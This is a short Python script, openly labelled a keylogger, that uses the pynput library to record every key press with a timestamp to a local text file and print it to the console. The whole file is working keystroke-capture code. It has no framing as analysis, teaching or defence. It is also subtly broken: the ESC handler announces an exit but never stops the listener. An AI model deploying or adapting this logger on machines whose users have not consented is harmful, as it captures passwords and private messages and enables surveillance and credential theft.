import asyncio

from pynput import keyboard
from datetime import datetime

def keyPressed(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    #print(str(key))
    with open('keyfile.txt', 'a') as file:
        try:
            if hasattr(key, 'char') and key.char is not None:
                file.write(f"{timestamp} {key.char}"+'\n')
                print(f"{timestamp} {key.char}")
            else:
                key_name = str(key).replace('Key.','')
                file.write(f"{timestamp} {key_name}"+'\n')
                print(f"{timestamp} {key_name}")
        except AttributeError:
            file.write(f"{timestamp} {key_name}"+'\n')
            print(f"{timestamp} {key_name}")
        except Exception as e:
            print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Exiting...")


if __name__ == '__main__':
    print("Keylogger started... Press ESC to exit.")

    with keyboard.Listener(on_press=keyPressed, on_release=on_release) as listener:
        listener.join()

    print("Keylogger stopped")

